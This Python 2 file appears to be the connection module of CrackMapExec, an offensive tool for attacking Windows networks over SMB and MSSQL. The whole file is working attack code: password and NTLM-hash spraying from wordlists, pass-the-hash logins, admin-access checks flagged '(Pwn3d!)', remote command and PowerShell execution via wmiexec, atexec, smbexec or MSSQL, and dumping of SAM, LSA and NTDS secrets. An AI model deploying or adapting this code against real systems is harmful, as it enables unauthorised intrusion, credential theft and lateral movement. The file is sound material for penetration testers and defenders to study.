import logging
import socket
from logging import getLogger
from traceback import format_exc
from StringIO import StringIO
from functools import wraps
from gevent.lock import BoundedSemaphore
from impacket.smbconnection import SMBConnection, SessionError
from impacket.nmb import NetBIOSError
from impacket import tds
from cme.mssql import *
from impacket.dcerpc.v5.rpcrt import DCERPCException
from cme.helpers import highlight, create_ps_command
from cme.logger import CMEAdapter
from cme.context import Context
from cme.enum.shares import ShareEnum
from cme.enum.uac import UAC
from cme.enum.rpcquery import RPCQUERY
from cme.enum.passpol import PassPolDump
from cme.enum.users import SAMRDump
from cme.enum.wmiquery import WMIQUERY
from cme.enum.lookupsid import LSALookupSid
from cme.credentials.secretsdump import DumpSecrets
from cme.credentials.wdigest import WDIGEST
from cme.spider.smbspider import SMBSpider
from cme.execmethods.mssqlexec import MSSQLEXEC
from cme.execmethods.wmiexec import WMIEXEC
from cme.execmethods.smbexec import SMBEXEC
from cme.execmethods.atexec import TSCH_EXEC
from impacket.dcerpc.v5 import transport, scmr

sem = BoundedSemaphore(1)
global_failed_logins = 0
user_failed_logins = {}

def requires_admin(func):
    def _decorator(self, *args, **kwargs):
        if self.admin_privs is False: return
        return func(self, *args, **kwargs)
    return wraps(func)(_decorator)

class Connection:

    def __init__(self, args, db, host, module, cmeserver):
        self.args = args
        self.db = db
        self.host = host
        self.module = module
        self.cmeserver = cmeserver
        self.conn = None
        self.hostname = None
        self.domain = None
        self.server_os = None
        self.logger = None
        self.password = None
        self.username = None
        self.hash = None
        self.admin_privs = False
        self.failed_logins = 0

        try:
            smb = SMBConnection(self.host, self.host, None, self.args.smb_port)

            #Get our IP from the socket
            local_ip = smb.getSMBServer().get_socket().getsockname()[0]

            #Get the remote ip address (in case the target is a hostname)
            remote_ip = smb.getRemoteHost()

            try:
                smb.login('' , '')
            except SessionError as e:
                if "STATUS_ACCESS_DENIED" in e.message:
                    pass

            self.host = remote_ip
            self.domain   = smb.getServerDomain()
            self.hostname = smb.getServerName()
            self.server_os = smb.getServerOS()

            if not self.domain:
                self.domain = self.hostname

            self.db.add_host(self.host, self.hostname, self.domain, self.server_os)

            self.logger = CMEAdapter(getLogger('CME'), {
                                                        'host': self.host,
                                                        'port': self.args.smb_port,
                                                        'hostname': u'{}'.format(self.hostname)
                                                       })

            self.logger.info(u"{} (name:{}) (domain:{})".format(
                                                                self.server_os,
                                                                self.hostname.decode('utf-8'),
                                                                self.domain.decode('utf-8')
                                                                ))

            try:
                '''
                    DC's seem to want us to logoff first, windows workstations sometimes reset the connection
                    (go home Windows, you're drunk)
                '''
                smb.logoff()
            except:
                pass

            if self.args.mssql:
                instances = None
                self.logger.extra['port'] = self.args.mssql_port

                mssql = tds.MSSQL(self.host, self.args.mssql_port, self.logger)
                mssql.connect()

                instances = mssql.getInstances(10)
                if len(instances) > 0:
                    self.logger.info("Found {} MSSQL instance(s)".format(len(instances)))
                    for i, instance in enumerate(instances):
                        self.logger.highlight("Instance {}".format(i))
                        for key in instance.keys():
                            self.logger.highlight(key + ":" + instance[key])

                try:
                    mssql.disconnect()
                except:
                    pass

            if (self.args.username and (self.args.password or self.args.hash)) or self.args.cred_id:

                if self.args.mssql and (instances is not None and len(instances) > 0):
                    self.conn = tds.MSSQL(self.host, self.args.mssql_port, self.logger)
                    self.conn.connect()

                elif not args.mssql:
                    self.conn = SMBConnection(self.host, self.host, None, self.args.smb_port)

        except socket.error:
            pass

        if self.conn:
            if self.args.domain:
                self.domain = self.args.domain

            if self.args.local_auth:
                self.domain = self.hostname

            self.login()

            if ((self.password is not None or self.hash is not None) and self.username is not None):

                if self.module:
                    module_logger = CMEAdapter(getLogger('CME'), {
                                                                  'module': module.name.upper(),
                                                                  'host': self.host,
                                                                  'port': self.args.smb_port,
                                                                  'hostname': self.hostname
                                                                 })
                    context = Context(self.db, module_logger, self.args)
                    context.localip  = local_ip

                    if hasattr(module, 'on_request') or hasattr(module, 'has_response'):
                        cmeserver.server.context.localip = local_ip

                    if hasattr(module, 'on_login'):
                        module.on_login(context, self)

                    if hasattr(module, 'on_admin_login') and self.admin_privs:
                        module.on_admin_login(context, self)

                elif self.module is None:
                    for k, v in vars(self.args).iteritems():
                        if hasattr(self, k) and hasattr(getattr(self, k), '__call__'):
                            if v is not False and v is not None:
                                getattr(self, k)()

    def over_fail_limit(self, username):
        global global_failed_logins
        global user_failed_logins

        if global_failed_logins == self.args.gfail_limit: return True
        if self.failed_logins == self.args.fail_limit: return True
        if username in user_failed_logins.keys():
            if self.args.ufail_limit == user_failed_logins[username]: return True

        return False

    def check_if_admin(self):
        if self.args.mssql:
            try:
                #I'm pretty sure there has to be a better way of doing this.
                #Currently we are just searching for our user in the sysadmin group

                self.conn.sql_query("EXEC sp_helpsrvrolemember 'sysadmin'")
                query_output = self.conn.printRows()
                if query_output.find('{}\\{}'.format(self.domain, self.username)) != -1:
                    self.admin_privs = True
            except:
                pass

        elif not self.args.mssql:
            '''
                We use the OpenSCManagerW Win32API call to to establish a handle to the remote host.
                If this succeeds, the user context has administrator access to the target.

                Idea stolen from PowerView's Invoke-CheckLocalAdminAccess
            '''

            stringBinding = r'ncacn_np:{}[\pipe\svcctl]'.format(self.host)

            rpctransport = transport.DCERPCTransportFactory(stringBinding)
            rpctransport.set_dport(self.args.smb_port)

            lmhash = ''
            nthash = ''
            if self.hash:
                if self.hash.find(':') != -1:
                    lmhash, nthash = self.hash.split(':')
                else:
                    nthash = self.hash

            if hasattr(rpctransport, 'set_credentials'):
                # This method exists only for selected protocol sequences.
                rpctransport.set_credentials(self.username, self.password if self.password is not None else '', self.domain, lmhash, nthash)
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(scmr.MSRPC_UUID_SCMR)

            lpMachineName = '{}\x00'.format(self.host)
            try:

                # 0xF003F - SC_MANAGER_ALL_ACCESS
                # http://msdn.microsoft.com/en-us/library/windows/desktop/ms685981(v=vs.85).aspx

                resp = scmr.hROpenSCManagerW(dce, lpMachineName, 'ServicesActive\x00', 0xF003F)
                self.admin_privs = True
            except DCERPCException:
                pass

    def plaintext_login(self, domain, username, password):
        try:
            if self.args.mssql:
                res = self.conn.login(None, username, password, domain, None, True if self.args.mssql_auth == 'windows' else False)
                if res is not True:
                    self.conn.printReplies()
                    return False

            elif not self.args.mssql:
                self.conn.login(username, password, domain)

            self.password = password
            self.username = username
            self.domain = domain
            self.check_if_admin()
            self.db.add_credential('plaintext', domain, username, password)

            if self.admin_privs:
                self.db.link_cred_to_host('plaintext', domain, username, password, self.host)

            out = u'{}\\{}:{} {}'.format(domain.decode('utf-8'),
                                         username.decode('utf-8'),
                                         password.decode('utf-8'),
                                         highlight('(Pwn3d!)') if self.admin_privs else '')

            self.logger.success(out)
            return True
        except SessionError as e:
            error, desc = e.getErrorString()
            self.logger.error(u'{}\\{}:{} {} {}'.format(domain.decode('utf-8'),
                                                        username.decode('utf-8'),
                                                        password.decode('utf-8'),
                                                        error,
                                                        '({})'.format(desc) if self.args.verbose else ''))
            if error == 'STATUS_LOGON_FAILURE':
                global global_failed_logins
                global user_failed_logins

                if username not in user_failed_logins.keys():
                    user_failed_logins[username] = 0

                user_failed_logins[username] += 1
                global_failed_logins += 1
                self.failed_logins += 1

            return False

    def hash_login(self, domain, username, ntlm_hash):
        lmhash = ''
        nthash = ''

        #This checks to see if we didn't provide the LM Hash
        if ntlm_hash.find(':') != -1:
            lmhash, nthash = ntlm_hash.split(':')
        else:
            nthash = ntlm_hash

        try:
            if self.args.mssql:
                res = self.conn.login(None, username, '', domain, ':' + nthash if not lmhash else ntlm_hash, True if self.args.mssql_auth == 'windows' else False)
                if res is not True:
                    self.conn.printReplies()
                    return False

            elif not self.args.mssql:
                self.conn.login(username, '', domain, lmhash, nthash)

            self.hash = ntlm_hash
            self.username = username
            self.domain = domain
            self.check_if_admin()
            self.db.add_credential('hash', domain, username, ntlm_hash)

            if self.admin_privs:
                self.db.link_cred_to_host('hash', domain, username, ntlm_hash, self.host)

            out = u'{}\\{} {} {}'.format(domain.decode('utf-8'),
                                         username.decode('utf-8'),
                                         ntlm_hash,
                                         highlight('(Pwn3d!)') if self.admin_privs else '')

            self.logger.success(out)
            return True
        except SessionError as e:
            error, desc = e.getErrorString()
            self.logger.error(u'{}\\{} {} {} {}'.format(domain.decode('utf-8'),
                                                        username.decode('utf-8'),
                                                        ntlm_hash,
                                                        error,
                                                        '({})'.format(desc) if self.args.verbose else ''))
            if error == 'STATUS_LOGON_FAILURE':
                global global_failed_logins
                global user_failed_logins

                if username not in user_failed_logins.keys():
                    user_failed_logins[username] = 0

                user_failed_logins[username] += 1
                global_failed_logins += 1
                self.failed_logins += 1

            return False

    def login(self):
        for cred_id in self.args.cred_id:
            with sem:
                try:
                    c_id, credtype, domain, username, password = self.db.get_credentials(filterTerm=cred_id)[0]

                    if not domain: domain = self.domain

                    if self.args.local_auth:
                        domain = self.domain
                    elif self.args.domain:
                        domain = self.args.domain

                    if credtype == 'hash' and not self.over_fail_limit(username):
                        self.hash_login(domain, username, password)

                    elif credtype == 'plaintext' and not self.over_fail_limit(username):
                        self.plaintext_login(domain, username, password)

                except IndexError:
                    self.logger.error("Invalid database credential ID!")

        for user in self.args.username:
            if type(user) is file:
                for usr in user:
                    if self.args.hash:
                        with sem:
                            for ntlm_hash in self.args.hash:
                                if type(ntlm_hash) is not file:
                                    if not self.over_fail_limit(usr.strip()):
                                        if self.hash_login(self.domain, usr.strip(), ntlm_hash): return

                                elif type(ntlm_hash) is file:
                                    for f_hash in ntlm_hash:
                                        if not self.over_fail_limit(usr.strip()):
                                            if self.hash_login(self.domain, usr.strip(), f_hash.strip()): return
                                    ntlm_hash.seek(0)

                    elif self.args.password:
                        with sem:
                            for password in self.args.password:
                                if type(password) is not file:
                                    if not self.over_fail_limit(usr.strip()):
                                        if self.plaintext_login(self.domain, usr.strip(), password): return

                                elif type(password) is file:
                                    for f_pass in password:
                                        if not self.over_fail_limit(usr.strip()):
                                            if self.plaintext_login(self.domain, usr.strip(), f_pass.strip()): return
                                    password.seek(0)

            elif type(user) is not file:
                    if self.args.hash:
                        with sem:
                            for ntlm_hash in self.args.hash:
                                if type(ntlm_hash) is not file:
                                    if not self.over_fail_limit(user):
                                        if self.hash_login(self.domain, user, ntlm_hash): return

                                elif type(ntlm_hash) is file:
                                    for f_hash in ntlm_hash:
                                        if not self.over_fail_limit(user):
                                            if self.hash_login(self.domain, user, f_hash.strip()): return
                                    ntlm_hash.seek(0)

                    elif self.args.password:
                        with sem:
                            for password in self.args.password:
                                if type(password) is not file:
                                    if not self.over_fail_limit(user):
                                        if self.plaintext_login(self.domain, user, password): return

                                elif type(password) is file:
                                    for f_pass in password:
                                        if not self.over_fail_limit(user):
                                            if self.plaintext_login(self.domain, user, f_pass.strip()): return
                                    password.seek(0)

    @requires_admin
    def execute(self, payload=None, get_output=False, methods=None):

        default_methods = ['wmiexec', 'atexec', 'smbexec']

        if not payload and self.args.execute:
            payload = self.args.execute
            if not self.args.no_output: get_output = True

        if self.args.mssql:
            exec_method = MSSQLEXEC(self.conn)
            logging.debug('Executed command via mssqlexec')

        elif not self.args.mssql:

            if not methods and not self.args.exec_method:
                methods = default_methods

            elif methods or self.args.exec_method:

                if not methods:
                    methods = [self.args.exec_method]

            for method in methods:

                if method == 'wmiexec':
                    try:
                        exec_method = WMIEXEC(self.host, self.username, self.password, self.domain, self.conn, self.hash, self.args.share)
                        logging.debug('Executed command via wmiexec')
                        break
                    except:
                        logging.debug('Error executing command via wmiexec, traceback:')
                        logging.debug(format_exc())
                        continue

                elif method == 'atexec':
                    try:
                        exec_method = TSCH_EXEC(self.host, self.username, self.password, self.domain, self.hash) #self.args.share)
                        logging.debug('Executed command via atexec')
                        break
                    except:
                        logging.debug('Error executing command via atexec, traceback:')
                        logging.debug(format_exc())
                        continue

                elif method == 'smbexec':
                    try:
                        exec_method = SMBEXEC(self.host, self.args.smb_port, self.username, self.password, self.domain, self.hash, self.args.share)
                        logging.debug('Executed command via smbexec')
                        break
                    except:
                        logging.debug('Error executing command via smbexec, traceback:')
                        logging.debug(format_exc())
                        continue

        if self.cmeserver:
            if hasattr(self.cmeserver.server.module, 'on_request') or hasattr(self.cmeserver.server.module, 'on_response'):
                self.cmeserver.server.hosts.append(self.host)

        output = u'{}'.format(exec_method.execute(payload, get_output).strip().decode('utf-8'))

        if self.args.execute or self.args.ps_execute:
            self.logger.success('Executed command {}'.format('via {}'.format(self.args.exec_method) if self.args.exec_method else ''))
            buf = StringIO(output).readlines()
            for line in buf:
                self.logger.highlight(line.strip())

        return output

    @requires_admin
    def ps_execute(self, payload=None, get_output=False, methods=None):
        if not payload and self.args.ps_execute:
            payload = self.args.ps_execute
            if not self.args.no_output: get_output = True

        return self.execute(create_ps_command(payload), get_output, methods)

    @requires_admin
    def sam(self):
        return DumpSecrets(self).SAM_dump()

    @requires_admin
    def lsa(self):
        return DumpSecrets(self).LSA_dump()

    @requires_admin
    def ntds(self):
        #We could just return the whole NTDS.dit database but in large domains it would be huge and would take up too much memory
        DumpSecrets(self).NTDS_dump(self.args.ntds, self.args.ntds_pwdLastSet, self.args.ntds_history)

    @requires_admin
    def wdigest(self):
        return getattr(WDIGEST(self), self.args.wdigest)()

    def shares(self):
        return ShareEnum(self).enum()

    @requires_admin
    def uac(self):
        return UAC(self).enum()

    def sessions(self):
        return RPCQUERY(self).enum_sessions()

    def disks(self):
        return RPCQUERY(self).enum_disks()

    def users(self):
        return SAMRDump(self).enum()

    def rid_brute(self):
        return LSALookupSid(self).brute_force()

    def pass_pol(self):
        return PassPolDump(self).enum()

    def lusers(self):
        return RPCQUERY(self).enum_lusers()

    @requires_admin
    def wmi(self):
        return WMIQUERY(self).query()

    def spider(self):
        spider = SMBSpider(self)
        spider.spider(self.args.spider, self.args.depth)
        spider.finish()

        return spider.results

    def mssql_query(self):
        self.conn.sql_query(self.args.mssql_query)
        return conn.printRows()
